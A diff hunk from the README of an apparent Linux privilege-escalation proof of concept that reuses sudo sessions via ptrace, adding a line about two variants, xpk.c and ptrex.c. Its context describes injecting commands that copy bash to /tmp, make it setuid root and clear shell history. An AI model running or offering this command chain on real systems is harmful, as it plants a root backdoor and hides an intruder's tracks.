@@ -19,6 +19,7 @@ WARNING: if GDB is installed in the machine is more safe run https://www.exploit
 
 my code is based in the s4vitar & vowkin POC and use ptrace (no GDB dep).
 
+I made two POC-flavours for the same thing xpk.c & ptrex.c
 
 ## xpk.c
 stdin hijack (using ptrace_do lib https://github.com/emptymonkey/ptrace_do): sudo -S cp /bin/bash /tmp + sudo -S chmod +s /tmp/bash + history -c 
